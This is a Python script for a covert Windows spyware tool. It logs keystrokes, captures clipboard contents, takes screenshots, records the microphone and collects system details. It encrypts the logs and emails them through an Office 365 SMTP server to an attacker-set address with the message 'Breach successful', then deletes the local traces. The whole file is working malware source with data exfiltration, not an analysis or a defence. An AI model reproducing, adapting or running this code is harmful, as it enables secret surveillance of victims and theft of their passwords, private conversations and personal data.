from email.mime.multipart import MIMEMultipart  #E-mail support
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket   #Socket support
import platform

import win32clipboard   #Clipboard support

from pynput.keyboard import Key,Listener #Keylogger

import time
import os

from scipy.io.wavfile import write  #Microphone Support
import sounddevice as sd

from cryptography.fernet import Fernet  #Encryption modules
import getpass
from requests import get

from multiprocessing import Process,freeze_support   #Image Processing
from PIL import ImageGrab

keys_info = "key_log.txt"
system_info = "system_info.txt"
clipboard_info="clipboard.txt"
audio_info="audio_info.wav"
screenshot_info="screenshot.png"

keys_info_e="e_key_log.txt"
system_info_e = "e_system_info.txt"
clipboard_info_e="e_clipboard.txt"


time_iteration=10 #seconds per iteration
no_end=1 	#no of iterations of code
microphone_time=10 #recording time for mic
email="" #enter sender email (outlook)
password="" #enter sender password
toaddr="" #enter receiever email (outlook)

key="4kA68DkMKND5r0u-LiYRU76XBvpxhKOqwkQwkIv8hvA=" #generate new using cryptography modules
file_path= "" #add path of project location here
extend="\\"
file_merge=file_path+extend

def send_email(filename,attachment,toaddr):  #use outlook account
    fromaddr=email
    msg=MIMEMultipart()
    msg['From']=fromaddr
    msg['To']=toaddr
    msg['Subject']='Log'
    body="Log attached. Breach successful."
    msg.attach(MIMEText(body,'plain'))
    filename=filename
    attachment=open(attachment,'rb')
    p=MIMEBase('application','octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition',"attachment; filename=%s"%filename)
    msg.attach(p)
    s=smtplib.SMTP('smtp.office365.com',587)
    s.starttls()
    s.login(fromaddr,password)
    text=msg.as_string()
    s.sendmail(fromaddr,toaddr,text)
    s.quit()


def comp_info():
    with open(file_path+extend+system_info,'a') as f:
        hostname=socket.gethostname()
        IPAddr=socket.gethostbyname(hostname)
        f.write("Processor: "+(platform.processor())+'\n')
        f.write("System: "+platform.system()+" "+platform.version()+'\n')
        f.write("Machine: "+platform.machine()+"\n")
        f.write("Hostname: "+hostname+"\n")
        f.write("Private IP Address: "+IPAddr+"\n")

comp_info()

def copy_clipboard():
    with open(file_path+extend+clipboard_info,"a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted=win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard data: \n"+pasted)
        except:
           f.write("Clipboard could not be copied!")

copy_clipboard()
def microphone():
    fs=44100
    seconds=microphone_time
    myrecord=sd.rec(int(seconds*fs),samplerate=fs,channels=2)
    sd.wait()
    write(file_path+extend+audio_info,fs,myrecord)


def screenshot():
    im=ImageGrab.grab()
    im.save(file_path+extend+screenshot_info)

screenshot()

number_of_its=0
currentTime=time.time()
stop_time=time.time()+time_iteration


while(number_of_its<no_end):
    count = 0
    keys = []
    def on_press(key):
        global keys,count,currentTime
        print(key)
        keys.append(key)
        count+=1
        currentTime=time.time()
        if(count>=1):
            count=0
            write_file(keys)
            keys=[]

    def write_file(keys):
        with open(file_path+extend+keys_info,'a')as f:
            for key1 in keys:
                k=str(key1).replace("'", "")
                if(k.find("space")>0):
                    f.write('\n')
                    f.close()
                elif k.find("Key")==-1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key==Key.esc:
            return False
        if currentTime>stop_time:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime>stop_time:
        with open(file_path+extend+keys_info,"a") as f:
            f.write("")
        screenshot()
        microphone()
        send_email(screenshot_info,file_path+extend+screenshot_info,toaddr)
        send_email(audio_info, file_path + extend + audio_info, toaddr)
        copy_clipboard()
        number_of_its+=1
        currentTime=time.time()
        stop_time=time.time()+time_iteration

files_to_encrypt=[file_merge+system_info,file_merge+clipboard_info,file_merge+keys_info]
encrypted_files=[file_merge+system_info_e,file_merge+clipboard_info_e,file_merge+keys_info_e]
count=0
for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count],'rb') as f:
        data=f.read()
    fernet=Fernet(key)
    encrypted=fernet.encrypt(data)
    with open(encrypted_files[count],'wb') as f:
        f.write(encrypted)
    send_email(encrypted_files[count],encrypted_files[count],toaddr)
    count+=1

time.sleep(10)
delete_files=[system_info,clipboard_info,keys_info,screenshot_info,audio_info]
for file in delete_files:
    os.remove(file_merge+file)